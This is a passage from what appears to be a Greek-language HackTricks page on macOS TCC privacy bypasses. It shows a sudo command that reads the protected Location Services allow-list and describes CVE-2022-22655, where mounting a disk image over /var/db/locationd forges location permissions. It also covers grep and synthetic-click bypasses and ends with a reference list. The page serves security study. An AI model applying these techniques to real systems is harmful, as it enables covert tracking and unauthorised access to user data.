Τα Location Services **δεν** αποθηκεύονται σε βάση δεδομένων TCC όπως οι άλλες υπηρεσίες. Η διαχείρισή τους γίνεται από το `locationd`, το οποίο διατηρεί τη δική του allow-list στο **`/var/db/locationd/clients.plist`**:<sup>[[5]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Κάθε καταχώριση προσδιορίζεται από τον client (bundle ID ή διαδρομή εκτελέσιμου) και περιέχει πεδία όπως `Authorized`, `BundleId`, `Executable` και `Registered`.

Το ίδιο το αρχείο `clients.plist` προστατεύεται από το Sandbox/TCC και δεν μπορεί να τροποποιηθεί ακόμη και ως root — όμως ο κατάλογος **`/var/db/locationd/` δεν προστατευόταν από mounting**. Έτσι, ένας attacker που εκτελούσε κώδικα ως root μπορούσε να δημιουργήσει ένα disk image που περιείχε το δικό του `clients.plist` (με το binary του επισημασμένο ως `Authorized`), να το κάνει mount πάνω από τον κατάλογο και να επανεκκινήσει το `locationd`, ώστε να ενεργοποιηθεί η πλαστογραφημένη allow-list.<sup>[[5]](#references)</sup>

> [!TIP]
> Αυτό ακολουθεί το ίδιο μοτίβο με τα TCC bypasses μέσω `hdiutil`/`mount` παραπάνω: το *file* προστατεύεται, ενώ ο *directory* στον οποίο βρίσκεται όχι, επομένως αντικαθιστάτε ολόκληρο τον directory αντί για το file.

## Μέσω startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Μέσω grep

Σε αρκετές περιπτώσεις, files αποθηκεύουν ευαίσθητες πληροφορίες, όπως emails, αριθμούς τηλεφώνου, messages... σε μη προστατευμένες τοποθεσίες (κάτι που θεωρείται vulnerability από την Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Αυτό δεν λειτουργεί πλέον, αλλά [**λειτουργούσε στο παρελθόν**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Ένας άλλος τρόπος με χρήση [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[19]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Αναφορές

- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [10] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [11] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [12] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [17] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [18] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
